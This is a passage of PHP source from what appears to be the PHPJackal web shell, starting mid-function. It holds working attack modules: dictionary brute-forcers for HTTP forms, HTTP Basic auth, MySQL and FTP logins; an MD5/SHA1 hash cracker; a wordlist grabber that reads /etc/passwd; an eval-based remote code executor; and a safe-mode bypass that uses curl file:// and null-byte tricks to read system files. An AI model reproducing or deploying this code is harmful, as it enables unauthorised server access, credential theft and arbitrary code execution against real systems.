global $errorbox,$footer,$et,$hcwd;
if(!empty($_REQUEST['start'])){
$url=$_REQUEST['target'];
$uf=$_REQUEST['userf'];
$pf=$_REQUEST['passf'];
$sf=$_REQUEST['submitf'];
$sv=$_REQUEST['submitv'];
$method=$_REQUEST['method'];
$fail=$_REQUEST['fail'];
$dic=$_REQUEST['dictionary'];
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";
if(!file_exists($dic)) die("$errorbox Can not open dictionary.$et$footer");
$dictionary=fopen($dic,'r');
echo "<font color=blue>Cracking started...<br>";
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
$url.="?$uf=$user&$pf=$pass&$sf=$sv";
$res=check_urL($url,$method,$fail,12);
if (!$res){echo "<font color=blue>U: $user P: $pass</font><br>";flusheR();if(!$type)break;}
flusheR();
}
fclose($dictionary);
echo "Done!</font><br>";
}
else echo "<center><table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"434\"><tr><td width=\"174\" bgcolor=\"#333333\">HTTP Form cracker:</td><td bgcolor=\"#333333\" width=\"253\"></td></tr><form method=\"POST\" name=form><tr><td width=\"174\" bgcolor=\"#666666\">Dictionary:</td><td bgcolor=\"#666666\" width=\"253\"><input type=text name=dictionary size=35></td></tr><tr><td width=\"174\" bgcolor=\"#808080\">Dictionary type:</td><td bgcolor=\"#808080\"><input type=radio name=combo checked value=0 onClick=\"document.form.user.disabled = false;\" style=\"border-width:1px;background-color:#808080;\">Simple (P)<input type=radio value=1 name=combo onClick=\"document.form.user.disabled = true;\" style=\"border-width:1px;background-color:#808080;\">Combo (U:P)</td></tr><tr><td width=\"174\" bgcolor=\"#666666\">Username:</td><td bgcolor=\"#666666\"><input type=text size=35 value=root name=user>$hcwd</td></tr><tr><td width=\"174\" bgcolor=\"#808080\">Action Page:</td><td bgcolor=\"#808080\" width=\"253\"><input type=text name=target value=\"http://".getenv('HTTP_HOST')."/login.php\" size=35></td></tr><tr><td width=\"174\" bgcolor=\"#666666\">Method:</td><td bgcolor=\"#666666\" width=\"253\"><select size=\"1\" name=\"method\"><option selected value=\"POST\">POST</option><option value=\"GET\">GET</option></select></td></tr><tr><td width=\"174\" bgcolor=\"#808080\">Username field name:</td><td bgcolor=\"#808080\" width=\"253\"><input type=text name=userf value=user size=35></td></tr><tr><td width=\"174\" bgcolor=\"#666666\">Password field name:</td><td bgcolor=\"#666666\" width=\"253\"><input type=text name=passf value=passwd size=35></td></tr><tr><td width=\"174\" bgcolor=\"#808080\">Submit name:</td><td bgcolor=\"#808080\" width=\"253\"><input type=text value=login name=submitf size=35></td></tr><tr><td width=\"174\" bgcolor=\"#666666\">Submit value:</td><td bgcolor=\"#666666\" width=\"253\"><input type=text value=\"Login\" name=submitv size=35></td></tr><tr><td width=\"174\" bgcolor=\"#808080\">Fail string:</td><td bgcolor=\"#808080\" width=\"253\"><input type=text name=fail value=\"Try again\" size=35></td></tr><tr><td width=\"174\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\" align=right width=\"253\"><input class=buttons type=submit name=start value=Start></td></tr></form></table></center>";
}
function hashcrackeR(){
global $errorbox,$t,$et,$hcwd;
if (!empty($_REQUEST['hash']) && !empty($_REQUEST['dictionary']) && !empty($_REQUEST['type'])){
$dictionary=fopen($_REQUEST['dictionary'],'r');
if ($dictionary){
$hash=strtoupper($_REQUEST['hash']);
echo "<font color=blue>Cracking " . htmlspecialchars($hash)."...<br>";flusheR();
$type=($_REQUEST['type']=='MD5')?'md5':'sha1';
while(!feof($dictionary)){
$word=trim(fgets($dictionary)," \n\r");
if ($hash==strtoupper(($type($word)))){echo "The answer is $word<br>";break;}
}
echo "Done!</font>";
fclose($dictionary);
}
else{
echo "$errorbox Can not open dictionary.$et";
}
}
echo "<center>${t}Hash cracker:</td><td bgcolor=\"#333333\"></td></tr><form method=\"POST\"><tr><td width=\"20%\" bgcolor=\"#666666\">Dictionary:</td><td bgcolor=\"#666666\"><input type=text name=dictionary size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Hash:</td><td bgcolor=\"#808080\"><input type=text name=hash size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#666666\">Type:</td><td bgcolor=\"#666666\"><select name=type><option selected value=MD5>MD5</option><option value=SHA1>SHA1</option></select></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\"></td><td bgcolor=\"#808080\" align=right>$hcwd<input class=buttons type=submit value=Start></td></tr></form></table></center>";
}
function pr0xy(){
global $errorbox,$et,$footer,$hcwd;
echo "<table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"100%\"><form method=\"POST\"><tr><td width=\"20%\"><b>Navigator: </b><input type=text name=urL size=140 value=\""; if(!!empty($_REQUEST['urL'])) echo "http://www.edpsciences.org/htbin/ipaddress"; else echo htmlspecialchars($_REQUEST['urL']);echo "\">$hcwd<input type=submit class=buttons value=Go></td></tr></form></table>";
if (!empty($_REQUEST['urL'])){
$dir="";
$u=parse_url($_REQUEST['urL']);
$host=$u['host'];$file=(!empty($u['path']))?$u['path']:'/';
if(substr_count($file,'/')>1)$dir=substr($file,0,(strpos($file,'/')));
$url=@fsockopen($host, 80, $errno, $errstr, 12);
if(!$url)die("<br>$errorbox Can not connect to host!$et$footer");
fputs($url, "GET /$file HTTP/1.0\r\nAccept-Encoding: text\r\nHost: $host\r\nReferer: $host\r\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.1; FreeBSD)\r\n\r\n");
while(!feof($url)){
$con = fgets($url);
$con = str_replace("href=mailto","HrEf=mailto",$con);
$con = str_replace("HREF=mailto","HrEf=mailto",$con);
$con = str_replace("href=\"mailto","HrEf=\"mailto",$con);
$con = str_replace("HREF=\"mailto","HrEf=\"mailto",$con);
$con = str_replace("href=\'mailto","HrEf=\"mailto",$con);
$con = str_replace("HREF=\'mailto","HrEf=\"mailto",$con);
$con = str_replace("href=\"http","HrEf=\"".hlinK("seC=px&urL=http"),$con);
$con = str_replace("HREF=\"http","HrEf=\"".hlinK("seC=px&urL=http"),$con);
$con = str_replace("href=\'http","HrEf=\"".hlinK("seC=px&urL=http"),$con);
$con = str_replace("HREF=\'http","HrEf=\"".hlinK("seC=px&urL=http"),$con);
$con = str_replace("href=http","HrEf=".hlinK("seC=px&urL=http"),$con);
$con = str_replace("HREF=http","HrEf=".hlinK("seC=px&urL=http"),$con);
$con = str_replace("href=\"","HrEf=\"".hlinK("seC=px&urL=http://$host/$dir/"),$con);
$con = str_replace("HREF=\"","HrEf=\"".hlinK("seC=px&urL=http://$host/$dir/"),$con);
$con = str_replace("href=\"","HrEf=\'".hlinK("seC=px&urL=http://$host/$dir/"),$con);
$con = str_replace("HREF=\"","HrEf=\'".hlinK("seC=px&urL=http://$host/$dir/"),$con);
$con = str_replace("href=","HrEf=".hlinK("seC=px&urL=http://$host/$dir/"),$con);
$con = str_replace("HREF=","HrEf=".hlinK("seC=px&urL=http://$host/$dir/"),$con);
echo $con;
}
fclose($url);
}
}
function mysqlclienT(){
global $t,$errorbox,$et,$hcwd;
if (!empty($_REQUEST['serveR']) && !empty($_REQUEST['useR']) && !empty($_REQUEST['pasS']) && !empty($_REQUEST['querY'])){
$server=$_REQUEST['serveR'];$pass=$_REQUEST['pasS'];$user=$_REQUEST['useR'];$query=$_REQUEST['querY'];
if(!empty($_REQUEST['dB']))$db=$_REQUEST['dB'];
$link = @mysql_connect($server,$user,$pass);
if($link){
if (!empty($db))mysql_select_db($db);
$result=mysql_query($query,$link);
echo "${t}Query result(s):$et";
echo "<font color=blue><pre>";
while($data=mysql_fetch_row($result)){
foreach($data as $v) {
echo $v;
echo "\t";
}
echo "\n";
}
echo "</pre></font>";
mysql_close($link);
}
else{
echo "$errorbox Login failed!$et<br>";
}
}
echo "<center>${t}MySQL cilent:</td><td bgcolor=\"#333333\"></td></tr><form method=\"POST\"><tr><td width=\"20%\" bgcolor=\"#666666\">Server:</td><td bgcolor=\"#666666\"><input type=text value=\"";if (!empty($_REQUEST['server'])) echo htmlspecialchars($_REQUEST['server']);else echo "localhost:3306"; echo "\" name=serveR size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Username:</td><td bgcolor=\"#808080\"><input type=text name=useR value=\"";if (!empty($_REQUEST['user'])) echo htmlspecialchars($_REQUEST['user']);else echo "root"; echo "\" size=35></td><tr><td width=\"20%\" bgcolor=\"#666666\">Password:</td><td bgcolor=\"#666666\"><input type=text value=\"";if (!empty($_REQUEST['pass'])) echo htmlspecialchars($_REQUEST['pass']);else echo "123456"; echo "\" name=pasS size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Database:</td><td bgcolor=\"#808080\"><input type=text value=\"";if (!empty($_REQUEST['db'])) echo htmlspecialchars($_REQUEST['db']); echo "\" name=dB size=35></td><tr><td width=\"20%\" bgcolor=\"#666666\">Query:</td><td bgcolor=\"#666666\"><textarea name=querY rows=5 cols=27>";if (!empty($_REQUEST['query'])) echo htmlspecialchars(($_REQUEST['query']));else echo "SHOW DATABASES"; echo "</textarea></td></tr></tr><tr><td width=\"20%\" bgcolor=\"#808080\"></td><td bgcolor=\"#808080\" align=right>$hcwd<input class=buttons type=submit value=\"Submit Query\"></td></tr></form></table></center>";
}
function phpevaL(){
global $t,$hcwd;
if (!empty($_REQUEST['code'])){
echo "<center><textarea rows=\"10\" cols=\"64\">";
$code = str_replace("<?php","",$_REQUEST['code']);
$code = str_replace("<?","",$code);
$code = str_replace("?>","",$code);
htmlspecialchars(eval($code));
echo "</textarea></center><br>";
}
echo "<center>${t}Evaler:</td><td bgcolor=\"#333333\"></td></tr><form method=\"POST\"><tr><td width=\"20%\" bgcolor=\"#666666\">Codes:</td><td bgcolor=\"#666666\"><textarea rows=\"10\" name=\"code\" cols=\"64\">";if(!empty($_REQUEST['code']))echo htmlspecialchars($_REQUEST['code']);echo "</textarea></td></tr><tr><td width=\"20%\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\" align=right>$hcwd<input class=buttons type=submit value=Execute></td></tr></form></table></center>";
}
function whoiS(){
global $t,$hcwd;
if (!empty($_REQUEST['server']) && !empty($_REQUEST['domain'])){
$server =$_REQUEST['server'];
$domain=$_REQUEST['domain']."\r\n";
$ser=fsockopen($server,43,$en,$es,5);
fputs($ser,$domain);
echo "<pre>";
while(!feof($ser))echo fgets($ser);
echo "</pre>";
fclose($ser);
}
else{
echo "<center>${t}Whois:</td><td bgcolor=\"#333333\"></td></tr><form method=\"POST\"><tr><td width=\"20%\" bgcolor=\"#666666\">Server:</td><td bgcolor=\"#666666\"><input type=text value=\"";if (!empty($_REQUEST['server'])) echo htmlspecialchars($_REQUEST['server']);else echo "whois.geektools.com"; echo "\" name=server size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">domain:</td><td bgcolor=\"#808080\"><input type=text name=domain value=\"";if (!empty($_REQUEST['domain'])) echo htmlspecialchars($_REQUEST['domain']); else echo "google.com"; echo  "\" size=35></td><tr><td bgcolor=\"#666666\"></td><td bgcolor=\"#666666\" align=right>$hcwd<input class=buttons type=submit value=\"Do\"></td></tr></form></table></center>";
}
}
function hexvieW(){
if (!empty($_REQUEST['filE'])){
$f = $_REQUEST['filE'];
echo "<table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"100%\"><td width=\"10%\" bgcolor=\"#282828\">Offset</td><td width=\"25%\" bgcolor=\"#282828\">Hex</td><td width=\"25%\" bgcolor=\"#282828\"></td><td width=\"40%\" bgcolor=\"#282828\">ASCII</td></tr>";
$file = fopen($f,"r");
$i= -1;
while (!feof($file)) {
$ln='';
$i++;
echo "<tr><td width=\"10%\" bgcolor=\"#";
if ($i % 2==0) echo "666666";else echo "808080";
echo "\">";echo str_repeat("0",(8-strlen($i * 16))).$i * 16;echo "</td>";
echo "<td width=\"25%\" bgcolor=\"#";
if ($i % 2==0) echo "666666";else echo "808080"; 
echo "\">";
for ($j=0;$j<=7;$j++){
if (!feof($file)){
$tmp = strtoupper(dechex(ord(fgetc($file))));
if (strlen($tmp)==1) $tmp = "0".$tmp;
echo $tmp." ";
$ln.=$tmp;
}
}
echo "</td><td width=\"25%\" bgcolor=\"#";
if ($i % 2==0) echo "666666";else echo "808080"; 
echo "\">";
for ($j=7;$j<=14;$j++){
if (!feof($file)){
$tmp = strtoupper(dechex(ord(fgetc($file))));
if (strlen($tmp)==1) $tmp = "0".$tmp;
echo $tmp." ";
$ln.=$tmp;
}
}
echo "</td><td width=\"40%\" bgcolor=\"#";
if ($i % 2==0) echo "666666";else echo "808080";
echo "\">";
$n=0;$asc="";$co=0;
for ($k=0;$k<=16;$k++){
$co=hexdec(substr($ln,$n,2));
if (($co<=31)||(($co>=127)&&($co<=160)))$co=46;
$asc.= chr($co);
$n+=2;
}
echo htmlspecialchars($asc);
echo "</td></tr>";
}
}
fclose($file);
echo "</table>";
}
function safemodE(){
global $windows,$t,$hcwd;
if (!empty($_REQUEST['file'])){
$i=1;
echo "<pre>\n<font color=green>Method $i:(ini_restore)</font><font color=blue>\n";
ini_restore("safe_mode");ini_restore("open_basedir");
$tmp = file_get_contents($_REQUEST['file']);
echo $tmp;
$i++;
echo "\n</font><font color=green>Method $i:(copy)</font><font color=blue>\n";
$tmp=tempnam("","cx");
copy("compress.zlib://".$_REQUEST['file'], $tmp);
$fh = fopen($tmp, "r");
$data = fread($fh, filesize($tmp));
fclose($fh);
echo $data;
$i++;
if(function_exists("curl_init")){
echo "\n</font><font color=green>Method $i:(curl_init)[A]</font><font color=blue>\n";
$fh = @curl_init("file://".$_REQUEST['file']."");
$tmp = @curl_exec($fh);
echo $tmp;
$i++;
echo "\n</font><font color=green>Method $i:(curl_init)[B]</font><font color=blue>\n";
$i++;
if(strstr($_REQUEST['file'],DIRECTORY_SEPARATOR))
$ch =curl_init("file:///".$_REQUEST['file']."\x00/../../../../../../../../../../../../".__FILE__);
else $ch = curl_init("file://".$_REQUEST['file']."\x00".__FILE__);
curl_exec($ch);
var_dump(curl_exec($ch));
}
if($_REQUEST['file'] == "/etc/passwd"){
echo "\n</font><font color=green>Method $i:(posix)</font><font color=blue>\n";
for($uid=0;$uid<99999;$uid++){
$h=posix_getpwuid($uid);
if (!empty($h))foreach($h as $v)echo "$v:";}}
$i++;
echo "</pre></font>";
}
echo "<center>${t}Anti Safe-Mode:</td><td bgcolor=\"#333333\"></td></tr><form method=\"POST\"><tr><td width=\"20%\" bgcolor=\"#666666\">File:</td><td bgcolor=\"#666666\"><input type=text value=\"";if (!empty($_REQUEST['file'])) echo htmlspecialchars($_REQUEST['file']);elseif(!$windows) echo "/etc/passwd"; echo "\" name=file size=35></td></tr><tr><td bgcolor=\"#808080\"></td><td bgcolor=\"#808080\" align=right>$hcwd<input class=buttons type=submit value=\"Read\"></td></tr></form></table></center>";
}
function crackeR(){
global $et;
$cwd = getcwd();
echo "<center><table border=0 bgcolor=#333333><tr><td><a href=\"".hlinK("seC=hc&workingdiR=$cwd")."\">[Hash]</a> - <a href=\"".hlinK("seC=smtp&workingdiR=$cwd")."\">[SMTP]</a> - <a href=\"".hlinK("seC=pop3&workingdiR=$cwd")."\">[POP3]</a> - <a href=\"".hlinK("seC=imap&workingdiR=$cwd")."\">[IMAP]</a> - <a href=\"".hlinK("seC=ftp&workingdiR=$cwd")."\">[FTP]</a> - <a href=\"".hlinK("seC=snmp&workingdiR=$cwd")."\">[SNMP]</a> - <a href=\"".hlinK("seC=sql&workingdiR=$cwd")."\">[MySQL]</a> - <a href=\"".hlinK("seC=fcr&workingdiR=$cwd")."\">[HTTP form]</a> - <a href=\"".hlinK("seC=auth&workingdiR=$cwd")."\">[HTTP Auth(basic)]</a> - <a href=\"".hlinK("seC=dic&workingdiR=$cwd")."\">[Dictionary maker]</a>$et</center>";
}
function dicmakeR(){
global $errorbox,$windows,$footer,$t,$et,$hcwd;
if (!empty($_REQUEST['combo'])&&($_REQUEST['combo']==1)) $combo=1 ; else $combo=0;
if (!empty($_REQUEST['range']) && !empty($_REQUEST['output']) && !empty($_REQUEST['min']) && !empty($_REQUEST['max'])){
$min = $_REQUEST['min'];
$max = $_REQUEST['max'];
if($max<$min)die($errorbox ."Bad input!$et". $footer);
$s =$w="";
$out = $_REQUEST['output'];
$r = ($_REQUEST['range']=='a' )?'a':'A';
if ($_REQUEST['range']==0) $r=0;
for($i=0;$i<$min;$i++) $s.=$r;
$dic = fopen($out,'a');
if(is_nan($r)){
while(strlen($s)<=$max){
$w = $s;
if($combo)$w="$w:$w";
fwrite($dic,$w."\n");
$s++;}
}
else{
while(strlen($w)<=$max){
$w =(string)str_repeat("0",($min - strlen($s))).$s;
if($combo)$w="$w:$w";
fwrite($dic,$w."\n");
$s++;}
}
fclose($dic);
echo "<font color=blue>Done</font>";
}
if (!empty($_REQUEST['input']) && !empty($_REQUEST['output'])){
$input=fopen($_REQUEST['input'],'r');
if (!$input){
if ($windows)echo $errorbox. "Unable to read from ".htmlspecialchars($_REQUEST['input']) ."$et<br>";
else{
$input=explode("\n",shelL("cat $input"));
$output=fopen($_REQUEST['output'],'w');
if ($output){
foreach ($input as $in){
$user = $in;
$user = trim(fgets($in)," \n\r");
if (!strstr($user,":"))continue;
$user=substr($user,0,(strpos($user,':')));
if($combo) fwrite($output,$user.":".$user."\n"); else fwrite($output,$user."\n");
}
fclose($input);fclose($output);
echo "<font color=blue>Done</font>";
}
}
}
else{
$output=fopen($_REQUEST['output'],'w');
if ($output){
while (!feof($input)){
$user = trim(fgets($input)," \n\r");
if (!strstr($user,":"))continue;
$user=substr($user,0,(strpos($user,':')));
if($combo) fwrite($output,$user.":".$user."\n"); else fwrite($output,$user."\n");
}
fclose($input);fclose($output);
echo "<font color=blue>Done</font>";
}
else echo $errorbox." Unable to write data to ".htmlspecialchars($_REQUEST['input']) ."$et<br>";
}
}elseif (!empty($_REQUEST['url']) && !empty($_REQUEST['output'])){
$res=downloadiT($_REQUEST['url'],$_REQUEST['output']);
if($combo && $res){
$file=file($_REQUEST['output']);
$output=fopen($_REQUEST['output'],'w');
foreach ($file as $v)fwrite($output,"$v:$v\n");
fclose($output);
}
echo "<font color=blue>Done</font>";
}else{
$temp=whereistmP();
echo "<center>${t}Wordlist generator:</td><td bgcolor=\"#333333\"></td></tr><form method=\"POST\"><tr><td width=\"20%\" bgcolor=\"#666666\">Range:</td><td bgcolor=\"#666666\"><select name=range><option value=a>a-z</option><option value=Z>A-Z</option><option value=0>0-9</option></select></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Min lenght:</td><td bgcolor=\"#808080\"><select name=min><option value=1>1</option><option value=2>2</option><option value=3>3</option><option value=4>4</option><option value=5>5</option><option value=6>6</option><option value=7>7</option><option value=8>8</option><option value=9>9</option><option value=10>10</option></select></td></tr><tr><td width=\"20%\" bgcolor=\"#666666\">Max lenght:</td><td bgcolor=\"#666666\"><select name=max><option value=2>2</option><option value=3>3</option><option value=4>4</option><option value=5>5</option><option value=6>6</option><option value=7>7</option><option value=8 selected>8</option><option value=9>9</option><option value=10>10</option><option value=11>11</option><option value=12>12</option><option value=13>13</option><option value=14>14</option><option value=15>15</option></select></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Output:</td><td bgcolor=\"#808080\"><input type=text value=\"$temp/.dic\" name=output size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\"><input type=checkbox name=combo style=\"border-width:1px;background-color:#666666;\" value=1 checked>Combo style output</td></tr><td bgcolor=\"#808080\"></td><td bgcolor=\"#808080\" align=right>$hcwd<input class=buttons type=submit value=Make></td></tr></form></table><br>${t}Grab dictionary:</td><td bgcolor=\"#333333\"></td></tr><form method=\"POST\"><tr><td width=\"20%\" bgcolor=\"#666666\">Grab from:</td><td bgcolor=\"#666666\"><input type=text value=\"/etc/passwd\" name=input size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Output:</td><td bgcolor=\"#808080\"><input type=text value=\"$temp/.dic\" name=output size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\"><input type=checkbox style=\"border-width:1px;background-color:#666666;\" name=combo value=1 checked>Combo style output</td></tr><td bgcolor=\"#808080\"></td><td bgcolor=\"#808080\" align=right>$hcwd<input class=buttons type=submit value=Grab></td></tr></form></table><br>${t}Download dictionary:</td><td bgcolor=\"#333333\"></td></tr><form method=\"POST\"><tr><td width=\"20%\" bgcolor=\"#666666\">URL:</td><td bgcolor=\"#666666\"><input type=text value=\"http://vburton.ncsa.uiuc.edu/wordlist.txt\" name=url size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Output:</td><td bgcolor=\"#808080\"><input type=text value=\"$temp/.dic\" name=output size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\"><input type=checkbox style=\"border-width:1px;background-color:#666666;\" name=combo value=1 checked>Combo style output</td></tr><tr><td bgcolor=\"#808080\"></td><td bgcolor=\"#808080\" align=right>$hcwd<input class=buttons type=submit value=Get></td></tr></form></table></center>";}
}
function calC(){
global $t,$et,$hcwd;
$fu = array('-','md5','sha1','crc32','hex','ip2long','long2ip','base64_encode','base64_decode','urldecode','urlencode');
if (!empty($_REQUEST['input']) && (in_array($_REQUEST['to'],$fu))){
echo "<center>${t}Output:<br><textarea rows=\"10\" cols=\"64\">";
if($_REQUEST['to']!='hex')echo $_REQUEST['to']($_REQUEST['input']);else for($i=0;$i<strlen($_REQUEST['input']);$i++)echo strtoupper(dechex(ord($_REQUEST['input']{$i})));
echo "</textarea>$et</center><br>";
}
echo "<center>${t}Convertor:</td><td bgcolor=\"#333333\"></td></tr><form method=\"POST\"><tr><td width=\"20%\" bgcolor=\"#666666\">Input:</td><td bgcolor=\"#666666\"><textarea rows=\"10\" name=\"input\" cols=\"64\">";if(!empty($_REQUEST['input']))echo htmlspecialchars($_REQUEST['input']);echo "</textarea></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Task:</td><td bgcolor=\"#808080\"><select size=1 name=to><option value=md5>MD5</option><option value=sha1>SHA1</option><option value=crc32>crc32</option><option value=ip2long>IP to long</option><option value=long2ip>Long to IP</option><option value=hex>HEX</option><option value=urlencode>URL encoding</option><option value=urldecode>URL decoding</option><option value=base64_encode>Base64 encoding</option><option value=base64_decode>Base64 decoding</option></select></td><tr><td width=\"20%\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\" align=right><input class=buttons type=submit value=Convert></td></tr>$hcwd</form></table></center>";
}
function authcrackeR(){
global $errorbox,$et,$t,$crack,$hcwd;
if(!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
$data='';
$method=($_REQUEST['method'])?'POST':'GET';
if(strstr($_REQUEST['target'],'?')){$data=substr($_REQUEST['target'],strpos($_REQUEST['target'],'?')+1);$_REQUEST['target']=substr($_REQUEST['target'],0,strpos($_REQUEST['target'],'?'));}
spliturL($_REQUEST['target'],$host,$page);
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";
if($method='GET')$page.=$data;
$dictionary=fopen($_REQUEST['dictionary'],'r');
echo "<font color=blue>";
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
$so=fsockopen($host,80,$en,$es,5);
if(!$so){echo "$errorbox Can not connect to host$et";break;}
else{
$packet="$method /$page HTTP/1.0\r\nAccept-Encoding: text\r\nHost: $host\r\nReferer: $host\r\nConnection: Close\r\nAuthorization: Basic ".base64_encode("$user:$pass");
if($method=='POST')$packet.="Content-Type: application/x-www-form-urlencoded\r\nContent-Length: ".strlen($data);
$packet.="\r\n\r\n";
$packet.=$data;
fputs($so,$packet);
$res=substr(fgets($so),9,2);
fclose($so);
if($res=='20')echo "U: $user P: $pass</br>";
flusheR();
}
}
echo "Done!</font>";
}else echo "<center><form method=\"POST\" name=form>${t}HTTP Auth cracker:</td><td bgcolor=\"#333333\"><select name=method><option value=1>POST</option><option value=0>GET</option></select></td></tr><tr><td width=\"20%\" bgcolor=\"#666666\">Dictionary:</td><td bgcolor=\"#666666\"><input type=text name=dictionary size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Dictionary type:</td><td bgcolor=\"#808080\"><input type=radio name=combo checked value=0 onClick=\"document.form.user.disabled = false;\" style=\"border-width:1px;background-color:#808080;\">Simple (P)<input type=radio value=1 name=combo onClick=\"document.form.user.disabled = true;\" style=\"border-width:1px;background-color:#808080;\">Combo (U:P)</td></tr><tr><td width=\"20%\" bgcolor=\"#666666\">Username:</td><td bgcolor=\"#666666\"><input type=text size=35 value=root name=user></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Server:</td><td bgcolor=\"#808080\"><input type=text name=target value=localhost size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\" align=right>$hcwd<input class=buttons type=submit value=Start></td></tr></form></table></center>";
}
function sqlcrackeR(){
global $errorbox,$t,$et,$crack;
if (!function_exists("mysql_connect")){
echo "$errorbox Server does n`t support MySQL$et";
}
else{
if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
$target=$_REQUEST['target'];
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";
$dictionary=fopen($_REQUEST['dictionary'],'r');
if ($dictionary){
echo "<font color=blue>Cracking ".htmlspecialchars($target)."...<br>";
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
$sql=@mysql_connect($target,$user,$pass);
if($sql){echo "U: $user P: $pass (<a href=\"".hlinK("seC=mysql&serveR=$target&useR=$user&pasS=$pass&querY=SHOW+DATABASES&workingdiR=".getcwd())."\">Connect</a>)<br>";mysql_close($sql);if(!$type)break;}
flusheR();
}
echo "<br>Done</font>";
fclose($dictionary);
}
else{
echo "$errorbox Can not open dictionary.$et";
}
}
else{
echo "<center>${t}MySQL cracker:$crack";
}
}
}
function ftpcrackeR(){
global $errorbox,$t,$et,$crack;
if (!function_exists("ftp_connect"))echo "$errorbox Server does n`t support FTP functions$et";
else{
if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
$target=$_REQUEST['target'];
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";
$dictionary=fopen($_REQUEST['dictionary'],'r');
if ($dictionary){
echo "<font color=blue>Cracking ".htmlspecialchars($target)."...<br>";
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
if(!$ftp=ftp_connect($target,21,8)){echo "$errorbox Can not connect to server.$et";break;}
if (@ftp_login($ftp,$user,$pass)){echo "U: $user P: $pass<br>";if(!$type)break;}
ftp_close($ftp);
flusheR();
}
echo "<br>Done</font>";
fclose($dictionary);
}
else{
echo "$errorbox Can not open dictionary.$et";
}
}
else echo "<center>${t}FTP cracker:$crack";
}}
function openiT($name){
$ext=strtolower(substr($name,strrpos($name,'.')+1));
$src=array('php','php3','php4','phps','phtml','phtm','inc');
if(in_array($ext,$src))highlight_file($name);
else echo "<font color=blue><pre>".htmlspecialchars(file_get_contents($name))."</pre></font>";
}
function logouT(){
setcookie('passw','',time()-10000);
header('Location: '.hlinK());
}
?>
<html>
<head>
<style>body{scrollbar-base-color: #484848; scrollbar-arrow-color: #FFFFFF; scrollbar-track-color: #969696;font-size:16px;font-family:"Arial Narrow";}Table { font-size: 15px; } .buttons{font-family:Verdana;font-size:10pt;font-weight:normal;font-style:normal;color:#FFFFFF;background-color:#555555;border-style:solid;border-width:1px;border-color:#FFFFFF;}textarea{border: 0px #000000 solid;background: #EEEEEE;color: #000000;}input{background: #EEEEEE;border-width:1px;border-style:solid;border-color:black}select{background: #EEEEEE; border: 0px #000000 none;}</style>
<meta http-equiv="Content-Language" content="en-us">
<title>PHPJackal</title>
</head><body text="#E2E2E2" bgcolor="#C0C0C0" link="#DCDCDC" vlink="#DCDCDC" alink="#DCDCDC">
<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#282828" bgcolor="#333333" width="100%">
